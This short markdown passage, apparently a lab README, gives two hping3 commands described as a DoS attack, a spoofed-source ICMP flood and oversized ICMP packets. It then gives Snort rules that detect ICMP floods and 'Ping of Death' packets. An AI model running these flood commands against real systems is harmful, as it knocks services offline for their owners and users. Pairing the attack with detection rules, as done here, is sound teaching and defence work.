## Run the DoS attack using hping3

```
sudo hping3 -1 -i u100 -c 100000 - rand-source {target_ip}
```

or 

```
sudo hping3 -1 -d 15000 -c 10 {target_ip}
```

## DOS ATTACK DETECTION
[DOS ATTACK DETECTION](https://github.com/maj0rmil4d/snort-ddos-mitigation/blob/main/dos.rules)

```
alert icmp !$HOME_NET any -> $HOME_NET any (msg:"Possible ICMP DDoS"; threshold: type both, track by_dst, count 100000, seconds 10; sid:100006;rev:1;)

#PING OF DEATH DETECTION
alert icmp any any -> $HOME_NET any (msg:"Possible Ping of Death"; dsize: > 10000; sid:555555;rev:1;)
```

